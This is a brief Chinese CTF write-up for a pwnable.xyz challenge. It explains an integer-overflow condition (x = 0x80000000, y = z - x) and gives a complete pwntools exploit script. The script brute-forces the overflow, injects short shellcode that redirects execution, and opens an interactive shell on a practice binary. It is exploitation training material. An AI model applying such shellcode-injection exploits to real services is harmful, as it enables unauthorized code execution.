### 知识点

- shellcode（长度不超过16）

- x+y=z     x*y=0   (x!=0   y!=0)

  x = 0x80000000

  y = z - x

  并不是所有值都有解



### 脚本

```python
from pwn import *
from ctypes import *

context(os='linux', arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']

# add    bh, bh -> 0x00 0xff
# for i in range(0, 256):
#     a = disasm(b'\x00' + p8(i) + p8(0x90))
#     print(a)
#     print('-------------------------------')

while True:
    # p = remote('svc.pwnable.xyz', 30028)
    p = process('./challenge')

    p.recvuntil(b'== ')
    z = int(p.recvuntil(b'> ')[:-3], 16)

    a = 0x80000000
    b = z - a

    if c_uint(a * b).value == 0:
        break
    p.close()

payload = str(a) + ' ' + str(b)
print(z, payload)
p.sendline(str.encode(payload))

p.recvuntil(b'Input:')
shellcode = asm('add bh, bh;' + 'pop rax;sub rax,718;call rax')
p.send(shellcode)

p.interactive()

```

